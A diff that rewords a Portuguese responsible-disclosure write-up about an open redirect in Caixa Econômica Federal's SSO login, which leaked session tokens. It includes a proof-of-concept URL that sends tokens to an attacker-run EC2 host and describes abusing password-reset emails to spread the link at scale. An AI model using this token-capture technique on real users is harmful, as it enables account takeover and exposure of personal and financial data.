@@ -17,57 +17,53 @@ Tabela de conteúdo:
 
 ### Sumário
 
-Essa publicação visa compartilhar uma vulnerabilidade de Open Redirect[[1]](#referências) encontrada no site da Caixa Econômica Federal, por meio da qual foi possível expor Tokens de Sessão de usuários.
+Esta publicação tem como objetivo compartilhar uma vulnerabilidade de Open Redirect[[1]](#referências) encontrada no site da Caixa Econômica Federal, por meio da qual foi possível expor Tokens de Sessão de usuários.
 
-Deve ser esclarecido que durante todos os testes, a única conta utilizada foi aquela para a qual se tinha autorização do titular e nenhuma outra conta ou informação de outros usuários foi acessada ou violada durante o desenvolvimento desta pesquisa e prova de conceito.
+É importante esclarecer que durante todos os testes, a única conta utilizada foi aquela cujo titular havia autorizado o uso. Nenhuma outra conta ou informação de terceiros foi acessada ou violada no decorrer desta pesquisa e da prova de conceito.
 
 Linha do tempo:
 
 ```plaintext
 01/01/2020: Descoberta da vulnerabilidade e criação da prova de conceito;
-01/05/2020: A vulnerabilidade foi reportada;
-01/07/2020: Confirmação da vulnerabilidade pela Caixa Econômica Federal;
-01/10/2020: Correção da vulnerabilidade;
+01/05/2020: Vulnerabilidade reportada;
+01/07/2020: Confirmação pela Caixa Econômica Federal;
+01/10/2020: Correção aplicada;
 01/10/2020: Divulgação deste artigo técnico;
 ```
 
-* Essa publicação também está dispoível em: [Espanhol](/2020/01/03/Obteniendo-un-Session-Token-Leak) e [Inglês](/2020/01/03/From-Open-Redirect-to-Session-Token-Leak);
+* Esta publicação também está dispoível em: [Espanhol](/2020/01/03/Obteniendo-un-Session-Token-Leak) e [Inglês](/2020/01/03/From-Open-Redirect-to-Session-Token-Leak);
 
 ---
 
 ### As vulnerabilidades
 
-Ao navegar pelas páginas web dos sistemas da Caixa Federal, foi identificada uma tela de autenticação que solicitava credenciais de acesso, identificadores como CPF, NIS, E-mail e uma senha. A página em questão é a tela de autenticação para acesso ao painel do Portal Cidadão.
+Durante a navegação pelas páginas web dos sistemas da Caixa Federal, foi identificada uma tela de autenticação que solicitava credenciais de acesso, identificadores como CPF, NIS, e-mail e uma senha. A página em questão é a tela de login para o painel do Portal Cidadão.
 
 ![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)
 
--
-
 A URL:
 
-[http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()
+- [http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()
 
-O último parâmetro da URL apresenta uma potencial vulnerabilidade de Open Redirect: &redirect_uri=. O valor inserido nesse parâmetro indica para qual URL o usuário será redirecionado ao final da atividade em questão, que neste caso é o login.
+O último parâmetro da URL, `&redirect_uri=`, apresenta uma possível vulnerabilidade de Open Redirect. Esse valor define para onde o usuário será redirecionado após o login.
 
-Para validar essa possibilidade, o valor do parâmetro &redirect_uri= na URL original foi alterado para o endereço da página inicial do Google. Por fim, ao preencher as credenciais válidas e realizar o login, é obtido o seguinte resultado:
+Para validar essa vulnerabilidade, o parâmetro `&redirect_uri=` foi alterado para apontar para a página inicial do Google. Após o preenchimento das credenciais válidas e realizar o login, o resultado obtido foi:
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
+- <iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
 
--
+Como demonstrado, a aplicação é vulnerável a Open Redirect. Contudo, um detalhe adicional foi observado: durante o redirecionamento, um parâmetro extra é incluído:
 
-Como demonstrado, a aplicação possui uma vulnerabilidade de Open Redirect. No entanto, há outro detalhe: durante o redirecionamento, um parâmetro adicional foi enviado, como pode ser observado na URL:
+- [https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)
 
-[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)
+Após a análise do parâmetro `?code=` e da requisição original, foi possível confirmar que o seu valor corresponde a um Token de Sessão[2].
 
-Após uma análise do parâmetro ?code= e da requisição original, foi possível validar que o valor desse parâmetro corresponde a um Token de Sessão[2].
-
-Com essa conclusão, tornou-se evidente que essa vulnerabilidade possui uma alta criticidade, pois o usuário poderia ser vítima de um ataque, onde ocorre um redirecionamento para uma URL maliciosa na qual um atacante possui controle total e então realiza a captura do Token de Sessão. Ao fazer isso, o atacante obtém acesso à conta do usuário, violando a confidencialidade e a integridade de seus dados.
+Essa descoberta evidencia a alta criticidade da falha. Um atacante poderia redirecionar a vítima para uma URL sob seu controle, capturar o token de sessão e, com isso, obter acesso à conta do usuário, violando a confidencialidade e integridade de seus dados.
 
 ---
 
 ### Prova de conceito
 
-Para comprovar a possibilidade do vazamento e captura do token, o seguinte código foi utilizado:
+Para comprovar a possibilidade de vazamento e captura do token, o código a seguir foi utilizado:
 
 ```perl
 #!/usr/bin/env perl
@@ -98,63 +94,53 @@ get "/" => sub ($catcher) {
 app -> start();
 ```
 
-Este código é responsável por capturar e armazenar os Tokens de Sessão que são enviados para a URL "maliciosa" sob controle do atacante. Além de capturar o Token de Sessão e armazená-lo em um arquivo de log, este script redireciona o usuário novamente, desta vez, para a URL verdadeira fazendo com que se obtenha uma sessão genuína no sistema da Caixa Federal. Como tal, é improvável que um usuário comum saiba que está sendo enganado. A URL da prova de conceito é estruturada da seguinte maneira:
+Este código captura e armazena tokens de sessão enviados para uma URL controlada pelo atacante. Após a captura, o usuário é redirecionado de volta ao portal oficial, obtendo uma sessão legítima — o que dificulta a percepção de que se trata de um golpe.
 
-[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
+A URL da PoC (Proof of Concept) fica assim:
 
-E o resultado obtido pode ser observado nesta gravação:
+- [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
+O resultado pode ser visualizado neste vídeo:
 
--
+- <iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>
 
-A superfície de ataque neste cenário ainda é restrita, exigindo que o usuário acesse a URL por conta própria (por meio de phishing ou engenharia social). 
+A superfície de ataque ainda é limitada, pois requer que a vítima acesse a URL maliciosa (geralmente por meio de phishing ou engenharia social).
 
+Além disso, descobriu-se que o parâmetro &redirect_uri= também é utilizado no e-mail de redefinição de senha. Ao solicitar uma nova senha, basta preencher o e-mail ou CPF da vítima. O link enviado ao e-mail incluirá o valor malicioso injetado.
 
-Além dessa vulnerabilidade, foi descoberto que o valor do parâmetro &redirect_uri= presente na página também é utilizado no e-mail quando um usuário solicita a troca de senha por meio do botão “Registrar/Esqueci minha senha”. Para utilizar essa funcionalidade podemos preencher o e-mail ou o CPF da vítima. Após preencher as informações, um link com o valor malicioso injetado, para cadastrar a nova senha é enviado por e-mail.
-
-Solicitando uma nova senha a partir da URL maliciosa, o conteúdo do e-mail será o seguinte:
+Exemplo do e-mail::
 
 ![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)
 
--
+Mesmo sendo enviado por um sistema legítimo da Caixa Federal, o link contém a URL sob controle do atacante. Ao acessar e redefinir a senha, o redirecionamento ocorre normalmente, resultando no vazamento do Token de Sessão.
 
-O e-mail é enviado por um sistema oficial da Caixa Federal. No entanto, ao observarmos o link, podemos ver que a URL está “infectada” com o link sob posse do atacante. Ao acessar o link e preencher a redefinição de senha, o redirecionamento ainda ocorre, resultando no vazamento do Token de Sessão.
-
-Com isso, um atacante pode utilizar esse mecanismo para enviar e-mails solicitando a redefinição de senha em nome da Caixa Econômica Federal, conferindo maior credibilidade ao link malicioso. Esse ataque pode ser realizado em grande escala, pois basta ter o CPF do alvo para isso.
+Esse vetor de ataque pode ser explorado em larga escala, exigindo apenas o CPF da vítima.
 
 ---
 
 ### Impacto
 
-Caso esta vulnerabilidade fosse explorada, um atacante poderia visualizar informações confidenciais do usuário, como demonstrado abaixo:
+Se explorada, essa vulnerabilidade permitiria a visualização de informações confidenciais do usuário, como:
 
 ![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)
 
-- Nome completo, CPF, data e hora do último acesso;
-
--
+- Nome completo, CPF, data e hora do último acesso.
 
 ![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)
 
--
-
-- Nome completo, número do PIS, empresa contratante, número da carteira de trabalho, conta FGTS, data de admissão, saldo em conta e os valores depositados em cada mês durante o período de trabalho na empresa;
+- Nome completo, número do PIS, empresa contratante, número da carteira de trabalho, conta do FGTS, data de admissão, saldo da conta e valores depositados mês a mês.
 
 ![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)
 
-
-- Endereço completo do usuário (além disso, é possível editar esses dados, já que não é necessário utilizar senha);
-
--
+- Endereço completo do usuário (inclusive editável, pois não há necessidade de senha para alteração).
 
 ---
 
 ### Conclusão
 
-Um atacante poderia explorar as vulnerabilidades mencionadas acima e, assim, violar a confidencialidade de várias contas legítimas de usuários da Caixa Econômica Federal. 
+Um atacante poderia explorar as vulnerabilidadesdescritas para comprometer a confidencialidade de contas legítimas de usuários da Caixa Econômica Federal. 
 
-Foi aconselhado à Caixa Econômica Federal conduzir uma investigação para validar se esse cenário de vulnerabilidades estava sendo explorado por agentes mal-intencionados na realização de golpes.
+Foi aconselhado à instituição a realização de uma investigação para identificar se tais vulnerabilidades já estavam sendo exploradas por agentes maliciosos em ataques reais.
 
 ---
 
